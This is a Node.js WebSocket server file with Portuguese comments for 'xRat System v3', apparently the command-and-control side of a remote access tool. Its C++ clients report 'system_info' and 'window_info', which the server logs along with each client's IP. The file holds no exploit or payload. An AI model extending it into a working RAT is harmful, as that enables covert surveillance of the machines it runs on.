// =============================================================================
// Servidor WebSocket para xRat System v3 - Cliente
// =============================================================================
// Descrição: Servidor WebSocket dedicado para cliente C++
// Porta: 8080
// Endpoint: /cli/ws
// Autor: Desenvolvedor C++
// Data: 12/08/2025
// =============================================================================

const WebSocket = require('ws');
const http = require('http');

// Criar servidor HTTP
const server = http.createServer();

// Criar servidor WebSocket
const wss = new WebSocket.Server({ 
    server: server,
    path: '/cli/ws'
});

console.log('🚀 Servidor WebSocket iniciando...');

// Listar clientes conectados
const clients = new Map();
let clientCounter = 0;

wss.on('connection', (ws, req) => {
    const clientId = ++clientCounter;
    const clientInfo = {
        id: clientId,
        ip: req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        connectedAt: new Date(),
        lastActivity: new Date()
    };
    
    clients.set(ws, clientInfo);
    
    console.log(`📱 Cliente #${clientId} conectado:`);
    console.log(`   IP: ${clientInfo.ip}`);
    console.log(`   Total de clientes: ${clients.size}`);
    
    // Enviar mensagem de boas-vindas
    ws.send(JSON.stringify({
        type: 'welcome',
        message: 'Conectado ao servidor xRat',
        clientId: clientId,
        timestamp: new Date().toISOString()
    }));

    // Teste de comunicação - enviar uma mensagem a cada 10 segundos
    const testInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
                type: 'server_ping',
                message: 'Teste de comunicação do servidor',
                timestamp: new Date().toISOString(),
                clientId: clientId
            }));
            console.log(`📤 Ping enviado para Cliente #${clientId}`);
        } else {
            clearInterval(testInterval);
        }
    }, 10000);

    // Handler para mensagens recebidas
    ws.on('message', (data) => {
        try {
            const message = data.toString();
            clientInfo.lastActivity = new Date();
            
            console.log(`📨 Mensagem do Cliente #${clientId}: ${message}`);
            
            // Tentar fazer parse como JSON
            let parsedMessage;
            try {
                parsedMessage = JSON.parse(message);
            } catch (e) {
                parsedMessage = { type: 'text', content: message };
            }
            
            // Responder baseado no tipo de mensagem
            switch (parsedMessage.type) {
                case 'ping':
                    ws.send(JSON.stringify({
                        type: 'pong',
                        timestamp: new Date().toISOString()
                    }));
                    break;
                    
                case 'system_info':
                    console.log(`💻 Info do sistema Cliente #${clientId}:`, parsedMessage.data);
                    break;
                    
                case 'window_info':
                    console.log(`🪟 Info da janela Cliente #${clientId}:`, parsedMessage.data);
                    break;
                    
                default:
                    // Echo da mensagem
                    ws.send(JSON.stringify({
                        type: 'echo',
                        original: parsedMessage,
                        timestamp: new Date().toISOString()
                    }));
            }
            
        } catch (error) {
            console.error(`❌ Erro ao processar mensagem do Cliente #${clientId}:`, error);
            ws.send(JSON.stringify({
                type: 'error',
                message: 'Erro ao processar mensagem',
                timestamp: new Date().toISOString()
            }));
        }
    });

    // Handler para desconexão
    ws.on('close', (code, reason) => {
        console.log(`📤 Cliente #${clientId} desconectado:`);
        console.log(`   Código: ${code}`);
        console.log(`   Razão: ${reason || 'Não especificada'}`);
        console.log(`   Total de clientes: ${clients.size - 1}`);
        clients.delete(ws);
    });

    // Handler para erros
    ws.on('error', (error) => {
        console.error(`❌ Erro no Cliente #${clientId}:`, error);
        clients.delete(ws);
    });
});

// Função para broadcast para todos os clientes
function broadcastToAll(message) {
    const data = JSON.stringify({
        type: 'broadcast',
        message: message,
        timestamp: new Date().toISOString()
    });
    
    clients.forEach((clientInfo, ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data);
        }
    });
    
    console.log(`📢 Broadcast enviado para ${clients.size} clientes: ${message}`);
}

// Status do servidor a cada 30 segundos
setInterval(() => {
    if (clients.size > 0) {
        console.log(`📊 Status: ${clients.size} cliente(s) conectado(s)`);
        clients.forEach((clientInfo, ws) => {
            const uptime = Date.now() - clientInfo.connectedAt.getTime();
            console.log(`   Cliente #${clientInfo.id}: ${Math.floor(uptime/1000)}s online`);
        });
    }
}, 30000);

// Iniciar servidor
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Servidor WebSocket rodando na porta ${PORT}`);
    console.log(`🔗 URL: ws://localhost:${PORT}/cli/ws`);
    console.log(`📡 Aguardando conexões de clientes C++...`);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Encerrando servidor...');
    
    // Notificar clientes sobre shutdown
    broadcastToAll('Servidor sendo desligado');
    
    // Fechar todas as conexões
    clients.forEach((clientInfo, ws) => {
        ws.close(1000, 'Servidor sendo desligado');
    });
    
    // Fechar servidor
    server.close(() => {
        console.log('✅ Servidor encerrado com sucesso');
        process.exit(0);
    });
});
